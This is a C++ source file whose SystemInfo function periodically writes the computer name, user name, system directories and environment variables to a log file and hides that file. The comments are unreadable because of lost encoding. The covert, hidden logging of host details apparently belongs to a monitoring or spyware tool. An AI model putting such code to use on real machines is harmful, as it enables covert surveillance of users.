#include "Systeminfo.h"
#define BUFSIZE 1024

void SystemInfo(bool run, char *logfile, unsigned int periodic)
{
	while (run)
	{
		for (int i = periodic; i > 0; i--)
		{
			Sleep(1000);
			if (i == 1)
			{
				LPTSTR lpszSystemInfo;      // ��������� �� ������, � �������
											// ����� ���������� � �������.
				DWORD cchBuff = 256;        // ����� ����� ���������� ���
											// ������������.
				TCHAR tchBuffer[BUFSIZE];   // ����� ��� ������.

				DWORD dwResult;             // ������������ �������� �������.

				lpszSystemInfo = tchBuffer;

				ofstream out;
				out.open(logfile, ios::app | ios::out);
				HideFile(logfile);

				out << "----------------------------------------------------------" << endl;
				out << "System information. "; OutFullData(out); out << "   |" << endl;
				out << "----------------------------------------------------------" << endl;

				// �������� � ���������� ��� ����������.

				if (GetComputerName(lpszSystemInfo, &cchBuff))
					out << " Computer name: " << lpszSystemInfo << endl;

				// �������� � ���������� ��� ������������.

				if (GetUserName(lpszSystemInfo, &cchBuff))
					out << " Username: " << lpszSystemInfo << endl;

				// �������� � ���������� ��������� ����������.

				if (GetSystemDirectory(lpszSystemInfo, MAX_PATH + 1))
					out << " System directory: " << lpszSystemInfo << endl;

				// �������� � ���������� ���������� Windows.

				if (GetWindowsDirectory(lpszSystemInfo, MAX_PATH + 1))
					out << " Windows directory: " << lpszSystemInfo << endl;

				out << " Partial list: " << endl;

				// �������� ���������� ��������� OS.

				dwResult = ExpandEnvironmentStrings("OS=%OS%", lpszSystemInfo, BUFSIZE);
				if (dwResult <= BUFSIZE)
					out << " OS: "<< lpszSystemInfo << endl;


				// �������� ���������� ��������� PATH.

				dwResult = ExpandEnvironmentStrings("PATH=%PATH%", lpszSystemInfo, BUFSIZE);
				if (dwResult <= BUFSIZE)
					out << " Path: " << lpszSystemInfo << endl;

				// �������� ���������� ��������� TMP.

				dwResult = ExpandEnvironmentStrings("TEMP=%TEMP%",lpszSystemInfo,BUFSIZE);
				if (dwResult <= BUFSIZE)
					out << " Temp: " << lpszSystemInfo << endl;

				out.close();
			}
		}
		pthread_testcancel();
	}
}
